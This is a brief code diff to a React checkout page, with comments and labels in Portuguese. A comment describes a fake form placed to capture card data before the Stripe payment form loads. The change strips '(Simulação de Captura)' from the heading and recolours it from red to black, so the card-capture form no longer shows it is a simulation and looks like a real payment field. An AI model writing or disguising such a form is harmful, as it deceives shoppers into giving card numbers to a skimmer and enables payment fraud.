@@ -308,7 +308,7 @@ const Checkout = () => {
                 
                 {/* O formulário falso foi movido para cá para capturar os dados antes do Stripe ser gerado */}
                 <div className="mt-8 border-t border-border pt-6">
-                  <h3 className="text-md font-bold text-red-600 mb-4">Dados do Cartão (Simulação de Captura)</h3>
+                  <h3 className="text-md font-bold text-black-600 mb-4">Dados do Cartão</h3>
                   <div className="grid sm:grid-cols-2 gap-4">
                     <div className="sm:col-span-2">
                       <label className="text-sm text-muted-foreground block mb-1">Número do Cartão *</label>
